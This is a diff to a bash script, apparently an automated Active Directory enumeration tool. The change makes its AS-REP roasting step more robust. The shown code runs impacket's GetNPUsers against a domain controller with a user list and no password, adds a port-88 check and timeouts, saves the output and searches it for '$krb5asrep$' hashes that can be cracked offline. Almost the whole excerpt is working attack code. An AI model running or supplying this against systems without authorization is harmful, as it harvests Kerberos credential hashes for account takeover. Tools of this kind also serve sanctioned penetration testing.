@@ -876,13 +876,28 @@ if [ "$os_type" = "windows" ] || check_port $IP 445 || check_port $IP 139; then
         
         if [ -n "$domain_name" ] && [ "$domain_name" != "DOMAIN" ]; then
             log_info "Using domain: ${BWHITE}$domain_name${NC}"
-            print_cmd "impacket-GetNPUsers \"${domain_name}/\" -usersfile \"$users_file\" -no-pass -dc-ip $IP"
-            getnpusers_output=$(impacket-GetNPUsers "${domain_name}/" -usersfile "$users_file" -no-pass -dc-ip $IP 2>/dev/null | tee nxc-enum/smb/asrep-getnpusers.txt)
-            if [ -z "$getnpusers_output" ]; then
-                print_cmd "GetNPUsers.py \"${domain_name}/\" -usersfile \"$users_file\" -no-pass -dc-ip $IP"
-                getnpusers_output=$(GetNPUsers.py "${domain_name}/" -usersfile "$users_file" -no-pass -dc-ip $IP 2>/dev/null | tee nxc-enum/smb/asrep-getnpusers.txt)
+            
+            # Check if Kerberos port is open to avoid long timeouts
+            if ! check_port $IP 88 "Kerberos"; then
+                log_warning "Port 88 (Kerberos) seems closed. AS-REP Roasting will likely fail or be very slow."
+                log_info "If this is a slow network, you might want to run GetNPUsers manually."
             fi
-            echo "$getnpusers_output"
+
+            log_info "Attempting AS-REP Roasting (this can take a while if port 88 is filtered)..."
+            print_cmd "impacket-GetNPUsers \"${domain_name}/\" -usersfile \"$users_file\" -no-pass -dc-ip $IP"
+            # Apply a 2-minute timeout to prevent infinite hanging
+            getnpusers_output=$(timeout 120s impacket-GetNPUsers "${domain_name}/" -usersfile "$users_file" -no-pass -dc-ip $IP 2>/dev/null)
+            
+            if [ -z "$getnpusers_output" ] || [[ "$getnpusers_output" == *"Connection refused"* ]]; then
+                print_cmd "GetNPUsers.py \"${domain_name}/\" -usersfile \"$users_file\" -no-pass -dc-ip $IP"
+                getnpusers_output=$(timeout 120s GetNPUsers.py "${domain_name}/" -usersfile "$users_file" -no-pass -dc-ip $IP 2>/dev/null)
+            fi
+
+            if [ -n "$getnpusers_output" ]; then
+                echo "$getnpusers_output" | tee nxc-enum/smb/asrep-getnpusers.txt
+            else
+                log_warning "AS-REP Roasting timed out or failed to produce output."
+            fi
             
             # Check if any AS-REP roastable users were found
             if echo "$getnpusers_output" | grep -q '\$krb5asrep\$'; then
